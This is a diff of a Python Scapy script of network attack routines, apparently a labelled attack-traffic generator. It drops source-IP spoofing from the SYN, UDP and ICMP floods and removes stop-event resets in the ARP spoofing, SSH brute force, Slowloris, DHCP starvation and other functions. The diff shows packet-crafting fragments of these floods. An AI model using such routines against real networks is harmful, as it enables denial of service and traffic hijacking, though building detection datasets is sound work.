@@ -41,7 +41,8 @@ except ImportError:
 
 conf.verb = 0
 
-# Global stop event
+# Global stop event — lifecycle managed EXCLUSIVELY by auto_attacker_runner.py
+# Attack functions must NOT call stop_event.clear()
 stop_event = threading.Event()
 
 # ----------------------
@@ -64,7 +65,7 @@ def create_ip_layer(dst, src=None):
         return IP(dst=dst)
 
 def timestamp():
-    return datetime.now().strftime("%Y%m%d_%H%M%S")
+    return datetime.now().strftime('%Y%m%d_%H%M%S_%f')
 
 def log(msg, level="info"):
     """Simple logging"""
@@ -94,14 +95,12 @@ def syn_flood_impl(target, port, intensity, delay, duration, label):
             if stop_event.is_set():
                 break
 
-            # Randomize source IP for DDoS simulation
-            spoof_src = RandIP6() if is_ipv6(target) else RandIP()
-            
+            # Single-Source DoS: Use true attacker IP (or static spoofed) instead of RandIP()
             # Realistic Window Sizes (Linux: 29200, Windows: 64240/65535)
             win_size = random.choice([29200, 64240, 65535, 8192])
             
             src_port = random.randint(1024, 65535)
-            pkt = create_ip_layer(target, src=spoof_src)/TCP(
+            pkt = create_ip_layer(target)/TCP(
                 sport=src_port, 
                 dport=port, 
                 flags="S",
@@ -122,7 +121,7 @@ def syn_flood_impl(target, port, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"SYN Flood completed: {total_sent} packets", "success")
 
 def udp_flood_impl(target, port, intensity, delay, duration, label):
@@ -138,9 +137,7 @@ def udp_flood_impl(target, port, intensity, delay, duration, label):
             if stop_event.is_set():
                 break
 
-            # Randomize source IP for DDoS simulation
-            spoof_src = RandIP6() if is_ipv6(target) else RandIP()
-            
+            # Single-Source DoS: Use true attacker IP instead of RandIP()
             # Action 1: Realistic UDP Payloads
             # 1. Valve Source Engine Query (A2S_INFO)
             valve_payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
@@ -153,12 +150,12 @@ def udp_flood_impl(target, port, intensity, delay, duration, label):
             choice = random.choice(["valve", "dns", "random", "random"]) # skewed slightly to random
             
             if choice == "valve":
-                pkt = create_ip_layer(target, src=spoof_src)/UDP(dport=port)/Raw(load=valve_payload)
+                pkt = create_ip_layer(target)/UDP(dport=port)/Raw(load=valve_payload)
             elif choice == "dns":
                 # DNS usually on port 53, but can be flooded anywhere
-                pkt = create_ip_layer(target, src=spoof_src)/UDP(dport=53)/dns_payload
+                pkt = create_ip_layer(target)/UDP(dport=53)/dns_payload
             else:
-                pkt = create_ip_layer(target, src=spoof_src)/UDP(dport=port)/random_payload
+                pkt = create_ip_layer(target)/UDP(dport=port)/random_payload
 
             pkts.append(pkt)
 
@@ -173,7 +170,7 @@ def udp_flood_impl(target, port, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"UDP Flood completed: {total_sent} packets", "success")
 
 def icmp_flood_impl(target, intensity, delay, duration, label):
@@ -194,13 +191,11 @@ def icmp_flood_impl(target, intensity, delay, duration, label):
 
             payload = ''.join(random.choices(string.ascii_letters, k=56))
 
-            # Randomize source IP for DDoS simulation
-            spoof_src = RandIP6() if is_ipv6(target) else RandIP()
-
+            # Single-Source DoS: Use true attacker IP instead of RandIP()
             if ipv6_mode:
-                pkt = IPv6(dst=target, src=spoof_src)/ICMPv6EchoRequest()/Raw(load=payload)
+                pkt = IPv6(dst=target)/ICMPv6EchoRequest()/Raw(load=payload)
             else:
-                pkt = IP(dst=target, src=spoof_src)/ICMP()/Raw(load=payload)
+                pkt = IP(dst=target)/ICMP()/Raw(load=payload)
 
             pkts.append(pkt)
 
@@ -215,7 +210,7 @@ def icmp_flood_impl(target, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"{protocol} Flood completed: {total_sent} packets", "success")
 
 def port_scan_impl(target, ports_list, delay, duration, label):
@@ -275,7 +270,7 @@ def port_scan_impl(target, ports_list, delay, duration, label):
         if scan_round % 5 == 0:
             log(f"Scan round {scan_round}: {total_packets} packets sent")
 
-    stop_event.clear()
+
     log(f"Port scan completed: {total_packets} total packets sent in {scan_round} rounds", "success")
 
 def dns_tunnel_impl(target, dns_server_ip, queries_per_sec, duration, label, mirror_to=None, mirror_mac=None, preserve_dst=False):
@@ -364,7 +359,7 @@ def dns_tunnel_impl(target, dns_server_ip, queries_per_sec, duration, label, mir
 
         time.sleep(1.0 / queries_per_sec)
 
-    stop_event.clear()
+
     log(f"DNS Tunneling completed: {total_queries} queries", "success")
 
 def arp_spoof_impl(target_ip, fake_mac, intensity, duration, label, dst_mac="ff:ff:ff:ff:ff:ff",
@@ -466,7 +461,7 @@ def arp_spoof_impl(target_ip, fake_mac, intensity, duration, label, dst_mac="ff:
 
         time.sleep(0.3)
 
-    stop_event.clear()
+
     log(f"ARP Spoofing completed: {total_sent} packets", "success")
 
 def ssh_brute_force_impl(target, port, usernames, passwords, delay, duration, label):
@@ -522,7 +517,7 @@ def ssh_brute_force_impl(target, port, usernames, passwords, delay, duration, la
             elapsed = int(time.time() - start_time)
             log(f"Round {round_num}: {total_attempts} attempts, {elapsed}s elapsed")
 
-    stop_event.clear()
+
     log(f"SSH Brute Force completed: {total_attempts} attempts in {round_num} rounds", "success")
 
 def brute_force_basic_impl(target, port, num_attempts, delay, duration, label):
@@ -582,7 +577,7 @@ def brute_force_basic_impl(target, port, num_attempts, delay, duration, label):
         
         time.sleep(0.01)
 
-    stop_event.clear()
+
     elapsed = int(time.time() - start_time)
     log(f"Brute Force completed: {attempts} attempts, {total_packets} packets in {elapsed}s", "success")
 
@@ -673,7 +668,7 @@ def slowloris_impl(target, port, connections, duration, label):
         # MINIMAL delay between bursts
         time.sleep(0.005)  # 5ms
 
-    stop_event.clear()
+
     elapsed = int(time.time() - start_time)
     log(f"Slowloris completed: {connection_count} connections, {total_packets} packets in {elapsed}s", "success")
 
@@ -714,7 +709,7 @@ def dhcp_starvation_impl(target, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"DHCP Starvation completed: {total_sent} discovers", "success")
 
 
@@ -747,7 +742,7 @@ def tcp_rst_impl(target, port, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"TCP RST Injection completed: {total_sent} packets", "success")
 
 
@@ -780,7 +775,7 @@ def icmp_redirect_impl(target, gateway_ip, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"ICMP Redirect completed: {total_sent} packets", "success")
 
 
@@ -814,7 +809,7 @@ def cam_overflow_impl(target, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"CAM Overflow completed: {total_sent} frames", "success")
 
 
@@ -844,7 +839,7 @@ def smurf_impl(target, broadcast_ip, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"Smurf completed: {total_sent} packets", "success")
 
 
@@ -876,7 +871,7 @@ def land_impl(target, port, intensity, delay, duration, label):
 
         time.sleep(delay)
 
-    stop_event.clear()
+
     log(f"Land Attack completed: {total_sent} packets", "success")
 
 
